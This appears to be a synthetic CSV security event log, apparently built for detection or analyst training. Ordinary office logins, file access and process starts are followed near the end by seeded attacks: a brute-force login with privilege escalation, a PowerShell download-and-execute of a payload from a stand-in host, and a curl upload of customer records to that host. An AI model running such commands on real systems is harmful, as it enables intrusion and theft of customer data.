timestamp,source_ip,destination_ip,user,event_type,action,status,process,command,file,bytes_transferred
2026-09-01 10:14:52,192.168.1.20,10.0.0.25,priya,process,process_start,success,code.exe,,,0
2026-09-01 10:15:18,10.0.0.21,10.0.0.20,rohan,file_access,read,success,,,presentation.pptx,0
2026-09-01 10:15:57,192.168.1.45,10.0.0.25,amit,process,process_start,success,chrome.exe,,,0
2026-09-01 10:16:27,192.168.1.10,10.0.0.20,priya,authentication,login,success,,,,0
2026-09-01 10:17:02,192.168.1.20,10.0.0.15,rohan,authentication,login,success,,,,0
2026-09-01 10:17:31,192.168.1.10,10.0.0.15,priya,network,connection,success,,,,2048
2026-09-01 10:18:13,192.168.1.20,10.0.0.25,neha,file_access,write,success,,,budget.xlsx,0
2026-09-01 10:18:55,192.168.1.20,10.0.0.15,neha,authentication,login,success,,,,0
2026-09-01 10:19:26,192.168.1.45,10.0.0.20,neha,authentication,login,success,,,,0
2026-09-01 10:20:10,192.168.1.10,10.0.0.20,rahul,network,connection,success,,,,2048
2026-09-01 10:20:31,10.0.0.21,10.0.0.20,priya,file_access,write,success,,,budget.xlsx,0
2026-09-01 10:21:08,192.168.1.20,10.0.0.15,neha,process,process_start,success,chrome.exe,,,0
2026-09-01 10:21:36,192.168.1.10,10.0.0.15,rohan,file_access,read,success,,,notes.txt,0
2026-09-01 10:22:25,192.168.1.20,10.0.0.20,neha,authentication,login,success,,,,0
2026-09-01 10:22:45,192.168.1.31,10.0.0.20,neha,network,request,success,,,,8192
2026-09-01 10:23:24,192.168.1.31,10.0.0.15,priya,authentication,login,success,,,,0
2026-09-01 10:24:12,192.168.1.31,10.0.0.15,rahul,authentication,login,success,,,,0
2026-09-01 10:24:46,192.168.1.20,10.0.0.15,rohan,authentication,login,success,,,,0
2026-09-01 10:25:07,192.168.1.10,10.0.0.25,rohan,file_access,write,success,,,report.pdf,0
2026-09-01 10:25:58,10.0.0.21,10.0.0.25,priya,authentication,login,success,,,,0
2026-09-01 10:26:28,10.0.0.21,10.0.0.25,rohan,network,request,success,,,,2048
2026-09-01 10:27:00,192.168.1.31,10.0.0.20,priya,file_access,write,success,,,notes.txt,0
2026-09-01 10:27:35,192.168.1.10,10.0.0.20,rahul,authentication,login,success,,,,0
2026-09-01 10:28:06,192.168.1.31,10.0.0.15,rohan,network,connection,success,,,,2048
2026-09-01 10:28:46,192.168.1.20,10.0.0.20,amit,network,connection,success,,,,4096
2026-09-01 10:29:13,192.168.1.31,10.0.0.15,priya,authentication,login,success,,,,0
2026-09-01 10:29:49,192.168.1.31,10.0.0.25,amit,file_access,write,success,,,budget.xlsx,0
2026-09-01 10:30:40,10.0.0.21,10.0.0.20,amit,network,connection,success,,,,1024
2026-09-01 10:31:15,192.168.1.31,10.0.0.15,neha,authentication,login,success,,,,0
2026-09-01 10:31:34,192.168.1.20,10.0.0.25,amit,process,process_start,success,explorer.exe,,,0
2026-09-01 10:32:22,192.168.1.10,10.0.0.15,rahul,file_access,read,success,,,presentation.pptx,0
2026-09-01 10:32:58,192.168.1.20,10.0.0.20,rohan,file_access,read,success,,,presentation.pptx,0
2026-09-01 10:33:26,192.168.1.31,10.0.0.15,rahul,file_access,read,success,,,presentation.pptx,0
2026-09-01 10:34:07,10.0.0.21,10.0.0.25,neha,file_access,read,success,,,budget.xlsx,0
2026-09-01 10:34:30,192.168.1.10,10.0.0.15,neha,network,request,success,,,,2048
2026-09-01 10:35:08,192.168.1.10,10.0.0.20,priya,authentication,login,success,,,,0
2026-09-01 10:35:42,192.168.1.45,10.0.0.20,priya,network,connection,success,,,,2048
2026-09-01 10:36:10,192.168.1.45,10.0.0.20,priya,network,connection,success,,,,4096
2026-09-01 10:36:56,192.168.1.45,10.0.0.25,rohan,network,connection,success,,,,1024
2026-09-01 10:37:28,10.0.0.21,10.0.0.20,priya,authentication,login,success,,,,0
2026-09-01 10:38:08,192.168.1.31,10.0.0.20,amit,authentication,login,success,,,,0
2026-09-01 10:38:48,192.168.1.31,10.0.0.15,priya,process,process_start,success,chrome.exe,,,0
2026-09-01 10:39:21,192.168.1.20,10.0.0.20,rohan,process,process_start,success,chrome.exe,,,0
2026-09-01 10:39:50,192.168.1.31,10.0.0.25,rohan,authentication,login,success,,,,0
2026-09-01 10:40:24,192.168.1.31,10.0.0.25,rohan,process,process_start,success,outlook.exe,,,0
2026-09-01 10:41:02,10.0.0.21,10.0.0.15,amit,file_access,write,success,,,notes.txt,0
2026-09-01 10:41:30,10.0.0.21,10.0.0.20,rohan,process,process_start,success,chrome.exe,,,0
2026-09-01 10:42:09,192.168.1.20,10.0.0.20,amit,network,request,success,,,,8192
2026-09-01 10:42:49,10.0.0.21,10.0.0.20,priya,file_access,read,success,,,presentation.pptx,0
2026-09-01 10:43:26,192.168.1.31,10.0.0.15,rohan,file_access,write,success,,,budget.xlsx,0
2026-09-01 10:43:51,192.168.1.10,10.0.0.15,priya,file_access,write,success,,,report.pdf,0
2026-09-01 10:44:34,10.0.0.21,10.0.0.15,neha,process,process_start,success,explorer.exe,,,0
2026-09-01 10:45:07,192.168.1.20,10.0.0.25,priya,authentication,login,success,,,,0
2026-09-01 10:45:33,192.168.1.20,10.0.0.15,neha,process,process_start,success,chrome.exe,,,0
2026-09-01 10:46:22,192.168.1.10,10.0.0.20,priya,file_access,write,success,,,presentation.pptx,0
2026-09-01 10:46:54,10.0.0.21,10.0.0.20,rohan,process,process_start,success,code.exe,,,0
2026-09-01 10:47:30,192.168.1.31,10.0.0.15,neha,network,request,success,,,,2048
2026-09-01 10:47:58,192.168.1.10,10.0.0.25,neha,network,connection,success,,,,4096
2026-09-01 10:48:35,10.0.0.21,10.0.0.15,amit,file_access,read,success,,,budget.xlsx,0
2026-09-01 10:49:12,192.168.1.20,10.0.0.15,priya,process,process_start,success,explorer.exe,,,0
2026-09-01 10:49:45,192.168.1.45,10.0.0.20,rohan,authentication,login,success,,,,0
2026-09-01 10:50:23,10.0.0.21,10.0.0.25,neha,authentication,login,success,,,,0
2026-09-01 10:51:03,192.168.1.45,10.0.0.15,neha,network,request,success,,,,8192
2026-09-01 10:51:33,10.0.0.21,10.0.0.25,rohan,file_access,write,success,,,budget.xlsx,0
2026-09-01 10:52:03,192.168.1.45,10.0.0.15,neha,process,process_start,success,outlook.exe,,,0
2026-09-01 10:52:42,192.168.1.45,10.0.0.15,priya,authentication,login,failed,,,,0
2026-09-01 10:53:23,192.168.1.10,10.0.0.15,rohan,process,process_start,success,code.exe,,,0
2026-09-01 10:53:54,192.168.1.10,10.0.0.20,priya,process,process_start,success,outlook.exe,,,0
2026-09-01 10:54:21,192.168.1.31,10.0.0.20,neha,process,process_start,success,outlook.exe,,,0
2026-09-01 10:55:03,192.168.1.10,10.0.0.20,amit,authentication,login,success,,,,0
2026-09-01 10:55:26,192.168.1.20,10.0.0.25,amit,authentication,login,success,,,,0
2026-09-01 10:56:20,192.168.1.10,10.0.0.15,rahul,file_access,read,success,,,budget.xlsx,0
2026-09-01 10:56:42,192.168.1.45,10.0.0.25,priya,authentication,login,success,,,,0
2026-09-01 10:57:16,192.168.1.31,10.0.0.20,neha,file_access,read,success,,,budget.xlsx,0
2026-09-01 10:57:54,10.0.0.21,10.0.0.15,rahul,network,request,success,,,,8192
2026-09-01 10:58:26,10.0.0.21,10.0.0.25,rahul,file_access,read,success,,,presentation.pptx,0
2026-09-01 10:59:14,10.0.0.21,10.0.0.15,rahul,network,request,success,,,,4096
2026-09-01 10:59:32,192.168.1.31,10.0.0.15,rohan,process,process_start,success,explorer.exe,,,0
2026-09-01 11:00:08,192.168.1.31,10.0.0.25,neha,process,process_start,success,code.exe,,,0
2026-09-01 11:00:53,10.0.0.21,10.0.0.25,priya,network,request,success,,,,8192
2026-09-01 11:01:28,192.168.1.31,10.0.0.20,rohan,file_access,read,success,,,presentation.pptx,0
2026-09-01 11:02:04,192.168.1.45,10.0.0.25,priya,process,process_start,success,outlook.exe,,,0
2026-09-01 11:02:25,192.168.1.31,10.0.0.15,neha,process,process_start,success,code.exe,,,0
2026-09-01 11:03:11,192.168.1.31,10.0.0.20,amit,network,connection,success,,,,2048
2026-09-01 11:03:37,192.168.1.45,10.0.0.20,priya,file_access,write,success,,,notes.txt,0
2026-09-01 11:04:24,192.168.1.10,10.0.0.20,rahul,file_access,write,success,,,budget.xlsx,0
2026-09-01 11:04:54,192.168.1.31,10.0.0.20,rohan,network,request,success,,,,4096
2026-09-01 11:05:31,192.168.1.31,10.0.0.20,neha,network,connection,success,,,,1024
2026-09-01 11:06:01,192.168.1.10,10.0.0.25,amit,file_access,read,success,,,budget.xlsx,0
2026-09-01 11:06:45,10.0.0.21,10.0.0.25,amit,network,connection,success,,,,2048
2026-09-01 11:07:14,192.168.1.31,10.0.0.15,priya,network,connection,success,,,,2048
2026-09-01 11:07:48,192.168.1.10,10.0.0.25,rahul,network,connection,success,,,,8192
2026-09-01 11:08:18,10.0.0.21,10.0.0.20,rahul,process,process_start,success,explorer.exe,,,0
2026-09-01 11:09:04,192.168.1.20,10.0.0.15,amit,network,request,success,,,,1024
2026-09-01 11:09:27,192.168.1.45,10.0.0.15,neha,authentication,login,success,,,,0
2026-09-01 11:10:18,192.168.1.10,10.0.0.15,amit,authentication,login,success,,,,0
2026-09-01 11:10:48,10.0.0.21,10.0.0.25,rohan,file_access,write,success,,,notes.txt,0
2026-09-01 11:11:24,10.0.0.21,10.0.0.20,amit,network,connection,success,,,,1024
2026-09-01 11:11:51,192.168.1.31,10.0.0.25,priya,authentication,login,success,,,,0
2026-09-01 11:12:25,192.168.1.10,10.0.0.15,rohan,authentication,login,success,,,,0
2026-09-01 11:13:14,192.168.1.31,10.0.0.15,neha,file_access,write,success,,,presentation.pptx,0
2026-09-01 11:13:44,192.168.1.20,10.0.0.20,rahul,file_access,write,success,,,report.pdf,0
2026-09-01 11:14:22,192.168.1.20,10.0.0.20,priya,file_access,read,success,,,report.pdf,0
2026-09-01 11:14:45,10.0.0.21,10.0.0.25,amit,network,request,success,,,,1024
2026-09-01 11:15:29,192.168.1.45,10.0.0.20,amit,process,process_start,success,explorer.exe,,,0
2026-09-01 11:15:52,192.168.1.10,10.0.0.20,rohan,network,request,success,,,,1024
2026-09-01 11:16:27,10.0.0.21,10.0.0.25,priya,authentication,login,failed,,,,0
2026-09-01 11:17:08,192.168.1.10,10.0.0.15,rohan,process,process_start,success,explorer.exe,,,0
2026-09-01 11:17:43,10.0.0.21,10.0.0.20,priya,process,process_start,success,chrome.exe,,,0
2026-09-01 11:18:25,192.168.1.45,10.0.0.20,amit,network,connection,success,,,,2048
2026-09-01 11:18:55,192.168.1.45,10.0.0.20,neha,process,process_start,success,chrome.exe,,,0
2026-09-01 11:19:34,192.168.1.31,10.0.0.20,rahul,network,connection,success,,,,8192
2026-09-01 11:20:11,10.0.0.21,10.0.0.20,rahul,process,process_start,success,chrome.exe,,,0
2026-09-01 11:20:36,192.168.1.31,10.0.0.25,rohan,process,process_start,success,explorer.exe,,,0
2026-09-01 11:21:06,192.168.1.31,10.0.0.25,priya,file_access,write,success,,,notes.txt,0
2026-09-01 11:21:55,192.168.1.10,10.0.0.25,rahul,file_access,read,success,,,presentation.pptx,0
2026-09-01 11:22:32,10.0.0.21,10.0.0.20,rahul,authentication,login,success,,,,0
2026-09-01 11:22:53,192.168.1.10,10.0.0.25,neha,file_access,write,success,,,presentation.pptx,0
2026-09-01 11:23:41,192.168.1.45,10.0.0.20,amit,process,process_start,success,code.exe,,,0
2026-09-01 11:24:14,192.168.1.20,10.0.0.20,rohan,file_access,read,success,,,report.pdf,0
2026-09-01 11:24:43,192.168.1.31,10.0.0.25,neha,network,connection,success,,,,4096
2026-09-01 11:25:19,10.0.0.21,10.0.0.25,rohan,process,process_start,success,code.exe,,,0
2026-09-01 11:25:59,192.168.1.45,10.0.0.20,rohan,network,request,success,,,,8192
2026-09-01 11:26:30,192.168.1.20,10.0.0.25,priya,process,process_start,success,code.exe,,,0
2026-09-01 11:27:08,192.168.1.31,10.0.0.25,rahul,process,process_start,success,explorer.exe,,,0
2026-09-01 11:27:42,192.168.1.45,10.0.0.15,priya,file_access,write,success,,,report.pdf,0
2026-09-01 11:28:19,10.0.0.21,10.0.0.20,rahul,authentication,login,success,,,,0
2026-09-01 11:28:53,192.168.1.10,10.0.0.20,priya,network,request,success,,,,8192
2026-09-01 11:29:35,192.168.1.31,10.0.0.25,rahul,process,process_start,success,outlook.exe,,,0
2026-09-01 11:30:10,10.0.0.21,10.0.0.15,neha,authentication,login,success,,,,0
2026-09-01 11:30:34,192.168.1.10,10.0.0.20,priya,authentication,login,success,,,,0
2026-09-01 11:31:03,192.168.1.20,10.0.0.25,neha,network,connection,success,,,,1024
2026-09-01 11:31:45,192.168.1.31,10.0.0.20,rahul,network,request,success,,,,2048
2026-09-01 11:32:17,192.168.1.45,10.0.0.25,rohan,file_access,read,success,,,budget.xlsx,0
2026-09-01 11:32:47,192.168.1.45,10.0.0.25,rohan,file_access,write,success,,,budget.xlsx,0
2026-09-01 11:33:27,192.168.1.31,10.0.0.20,neha,network,connection,success,,,,8192
2026-09-01 11:34:04,192.168.1.20,10.0.0.15,rohan,process,process_start,success,outlook.exe,,,0
2026-09-01 11:34:48,192.168.1.45,10.0.0.25,amit,network,request,success,,,,4096
2026-09-01 11:35:11,192.168.1.45,10.0.0.15,neha,file_access,write,success,,,presentation.pptx,0
2026-09-01 11:35:58,192.168.1.31,10.0.0.15,amit,process,process_start,success,outlook.exe,,,0
2026-09-01 11:36:15,192.168.1.10,10.0.0.25,rohan,process,process_start,success,outlook.exe,,,0
2026-09-01 11:36:57,192.168.1.31,10.0.0.15,rohan,file_access,write,success,,,budget.xlsx,0
2026-09-01 11:37:45,192.168.1.10,10.0.0.20,rahul,process,process_start,success,chrome.exe,,,0
2026-09-01 11:38:18,192.168.1.20,10.0.0.15,amit,network,request,success,,,,8192
2026-09-01 11:38:40,192.168.1.20,10.0.0.25,priya,network,request,success,,,,2048
2026-09-01 11:39:18,192.168.1.31,10.0.0.25,neha,network,connection,success,,,,8192
2026-09-01 11:39:47,192.168.1.20,10.0.0.25,priya,process,process_start,success,outlook.exe,,,0
2026-09-01 11:40:22,192.168.1.10,10.0.0.20,neha,authentication,login,success,,,,0
2026-09-01 11:41:03,192.168.1.45,10.0.0.25,rohan,network,connection,success,,,,2048
2026-09-01 11:41:45,10.0.0.21,10.0.0.25,rahul,network,connection,success,,,,1024
2026-09-01 11:42:25,192.168.1.31,10.0.0.25,neha,process,process_start,success,chrome.exe,,,0
2026-09-01 11:42:44,192.168.1.10,10.0.0.20,rahul,process,process_start,success,chrome.exe,,,0
2026-09-01 11:43:18,10.0.0.21,10.0.0.15,priya,process,process_start,success,explorer.exe,,,0
2026-09-01 11:44:01,192.168.1.45,10.0.0.25,rohan,file_access,write,success,,,report.pdf,0
2026-09-01 11:44:40,192.168.1.45,10.0.0.20,rohan,authentication,login,success,,,,0
2026-09-01 12:00:00,185.44.21.9,10.0.0.15,admin,authentication,login,failed,,,,0
2026-09-01 12:00:08,185.44.21.9,10.0.0.15,admin,authentication,login,failed,,,,0
2026-09-01 12:00:16,185.44.21.9,10.0.0.15,admin,authentication,login,failed,,,,0
2026-09-01 12:00:24,185.44.21.9,10.0.0.15,admin,authentication,login,failed,,,,0
2026-09-01 12:00:32,185.44.21.9,10.0.0.15,admin,authentication,login,failed,,,,0
2026-09-01 12:00:40,185.44.21.9,10.0.0.15,admin,authentication,login,failed,,,,0
2026-09-01 12:01:05,185.44.21.9,10.0.0.15,admin,authentication,login,success,,,,0
2026-09-01 12:01:35,185.44.21.9,10.0.0.15,admin,privilege,privilege_escalation,success,sudo.exe,sudo admin,,0
2026-09-01 13:00:00,192.168.1.20,10.0.0.15,rahul,authentication,login,success,,,,0
2026-09-01 13:00:20,192.168.1.20,10.0.0.15,rahul,process,process_start,success,powershell.exe,powershell -enc SQBFAFgA,,0
2026-09-01 13:00:30,192.168.1.20,10.0.0.15,rahul,network,file_download,success,powershell.exe,Invoke-WebRequest http://external.example/payload.ps1,payload.ps1,524288
2026-09-01 13:00:45,192.168.1.20,10.0.0.15,rahul,process,process_start,success,powershell.exe,powershell -ExecutionPolicy Bypass -File payload.ps1,payload.ps1,0
2026-09-01 14:00:00,192.168.1.45,10.0.0.25,neha,authentication,login,success,,,,0
2026-09-01 14:00:40,192.168.1.45,10.0.0.25,neha,file_access,read,success,explorer.exe,,customer_records.zip,0
2026-09-01 14:00:55,192.168.1.45,203.0.113.50,neha,network,data_transfer,success,curl.exe,curl -T customer_records.zip https://external.example/upload,customer_records.zip,52428800
2026-09-01 14:01:10,192.168.1.45,203.0.113.50,neha,network,connection,success,curl.exe,,,104857600
